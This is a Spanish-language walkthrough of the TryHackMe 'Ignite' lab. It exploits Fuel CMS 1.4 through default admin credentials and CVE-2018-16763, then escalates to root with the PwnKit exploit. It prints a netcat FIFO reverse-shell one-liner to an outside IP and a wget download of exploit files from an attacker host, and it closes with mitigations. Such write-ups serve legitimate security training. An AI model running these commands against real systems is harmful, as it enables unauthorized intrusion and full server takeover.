# Ignite

**Plataforma:** TryHackMe  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / Fuel CMS / RCE / SUID / Pkexec

## 1. Reconocimiento

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.130.175.229
```

- Encontramos únicamente:

- `80/tcp` → HTTP

- Accedemos a:

```text
http://10.130.175.229
```

- Identificamos que la aplicación utiliza **Fuel CMS** versión `1.4`.

## 2. Enumeración

### Fuzzing web

- Realizamos fuzzing para descubrir rutas y archivos:

```bash
ffuf -u http://10.130.175.229/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
/0
/home
/index
/index.php
/offline
/robots.txt
```

- Revisamos `robots.txt`:

```text
http://10.130.175.229/robots.txt
```

- Encontramos:

```text
Disallow: /fuel/
```

- Accedemos al directorio:

```text
http://10.130.175.229/fuel/
```

- Encontramos el panel de administración de Fuel CMS.

- La aplicación nos redirige a una URL de login similar a:

```text
http://10.130.175.229/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d
```

### Credenciales por defecto

- Probamos las credenciales:

```text
Usuario: admin
Contraseña: admin
```

- Conseguimos acceder al panel de administración.

- Dentro encontramos las diferentes funciones del CMS:

```text
My Website

Site
    Dashboard
    Pages
    Blocks
    Navigation
    Assets
    Site Variables

Manage
    Users
    Permissions
    Page Cache
    Activity Log
    Settings
```

- No encontramos inicialmente una funcionalidad sencilla para subir una reverse shell, así que continuamos buscando vulnerabilidades conocidas para la versión instalada.

### Búsqueda de exploits

- Utilizamos Searchsploit:

```bash
searchsploit fuelcms 1.4
```

- Encontramos:

```text
Fuel CMS 1.4.1 - Remote Code Execution
```

- El exploit está asociado a:

```text
CVE-2018-16763
```

- Lo copiamos a nuestra máquina:

```bash
searchsploit -m 47138
```

- Adaptamos el script para Python 3.

## 3. Explotación

### Fuel CMS — CVE-2018-16763

- Ejecutamos el exploit adaptado:

```bash
python3 47138-python3.py
```

- Conseguimos ejecutar comandos remotamente sobre el servidor.

- Comprobamos:

```bash
id
```

- La ejecución funciona, pero el exploit está limitado a ejecutar comandos individuales y no nos proporciona una shell interactiva.

### Reverse Shell

- Para obtener una shell interactiva utilizamos una named pipe (`FIFO`) como mecanismo de comunicación entre la shell y `nc`.

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

- Utilizamos la siguiente reverse shell:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.173.148 4444 > /tmp/f
```

- La cadena realiza lo siguiente:

```text
mkfifo /tmp/f
    ↓
Crea una named pipe
    ↓
cat lee los comandos desde la pipe
    ↓
/bin/bash -i ejecuta una shell interactiva
    ↓
nc envía la entrada/salida hacia nuestra máquina
```

- Recibimos la conexión y obtenemos acceso como:

```text
www-data
```

### User Flag

- Nos dirigimos al directorio del usuario:

```bash
cd /home
ls
```

- Localizamos la User Flag y la leemos.

### Mejorar la shell

- La reverse shell inicial no dispone de una terminal completamente funcional.

- Utilizamos Python para obtener una pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Ahora disponemos de una TTY más funcional.

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos si `www-data` puede ejecutar algún comando mediante `sudo`:

```bash
sudo -l
```

- No encontramos ningún comando útil.

### Enumeración de SUID

- Buscamos binarios con el bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- Encontramos:

```text
/usr/bin/pkexec
```

- Comprobamos la versión:

```bash
pkexec --version
```

- Obtenemos:

```text
pkexec version 0.105
```

- Esta versión es vulnerable a:

```text
CVE-2021-4034
```

- La vulnerabilidad es conocida como **PwnKit** y permite escalar privilegios hasta `root`.

### Explotación de PwnKit

- Clonamos el exploit:

```bash
git clone https://github.com/berdav/CVE-2021-4034.git
```

- Entramos en el directorio:

```bash
cd CVE-2021-4034
```

- Levantamos un servidor HTTP en nuestra máquina para transferir los archivos:

```bash
python3 -m http.server 8000
```

- Desde la máquina víctima descargamos los archivos:

```bash
wget -r -np -nH --cut-dirs=0 http://192.168.173.148:8000/
```

- Una vez transferidos, compilamos el exploit:

```bash
make
```

- Se genera el binario:

```text
cve-2021-4034
```

- Lo ejecutamos:

```bash
./cve-2021-4034
```

- Comprobamos nuestros privilegios:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos.

- Finalmente accedemos a la Root Flag:

```bash
cd /root
cat root.txt
```

## 5. Reporte

- La máquina **Ignite** expone únicamente HTTP en el puerto `80`.
- Identificamos **Fuel CMS 1.4** y mediante fuzzing descubrimos el directorio `/fuel/`.
- El panel de administración permite autenticarnos utilizando las credenciales por defecto `admin:admin`.
- Buscando vulnerabilidades para Fuel CMS encontramos **CVE-2018-16763**, que permite ejecutar comandos remotamente.
- Utilizamos el exploit de Searchsploit y lo adaptamos para Python 3.
- El exploit permite ejecutar comandos individuales, por lo que utilizamos una FIFO reverse shell para obtener una conexión interactiva como `www-data`.
- Después de obtener acceso inicial, comprobamos `sudo` y los binarios SUID.
- Encontramos `pkexec` versión `0.105`, vulnerable a **CVE-2021-4034 (PwnKit)**.
- Transferimos y compilamos el exploit en la máquina víctima.
- Ejecutamos `cve-2021-4034` y conseguimos escalar privilegios hasta `root`.
- Finalmente recuperamos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP :80
 ↓
Fuel CMS 1.4
 ↓
/fuel/
 ↓
admin:admin
 ↓
CVE-2018-16763
 ↓
RCE
 ↓
FIFO Reverse Shell
 ↓
www-data
 ↓
SUID
 ↓
pkexec 0.105
 ↓
CVE-2021-4034
 ↓
PwnKit
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| Credenciales por defecto `admin:admin` | Alta | Acceso al panel administrativo |
| Fuel CMS — CVE-2018-16763 | Crítica | Remote Code Execution |
| pkexec 0.105 — CVE-2021-4034 | Crítica | Escalada de privilegios a root |

### Mitigaciones

- Cambiar las credenciales por defecto durante la instalación.
- Actualizar Fuel CMS a una versión corregida.
- Validar y filtrar correctamente los parámetros utilizados por la aplicación.
- Mantener Polkit/pkexec actualizado.
- Revisar periódicamente los binarios SUID instalados en el sistema.
- Aplicar el principio de mínimo privilegio.

## 🧠 Lessons Learned

- Las credenciales por defecto deben probarse durante la enumeración, pero nunca deben mantenerse en producción.
- `robots.txt` puede revelar rutas interesantes aunque no proporcione acceso directamente.
- `searchsploit` permite localizar exploits asociados a versiones concretas de software.
- Una RCE que solo permite ejecutar comandos individuales puede convertirse en una reverse shell utilizando mecanismos como una FIFO.
- `python3 -c 'import pty; pty.spawn("/bin/bash")'` permite mejorar una shell limitada.
- `sudo -l` y la búsqueda de SUID son comprobaciones básicas durante la escalada de privilegios.
- `pkexec` con una versión vulnerable puede permitir escalar privilegios a root mediante PwnKit.
- Transferir exploits mediante un servidor HTTP local es una técnica habitual en laboratorios de pentesting.
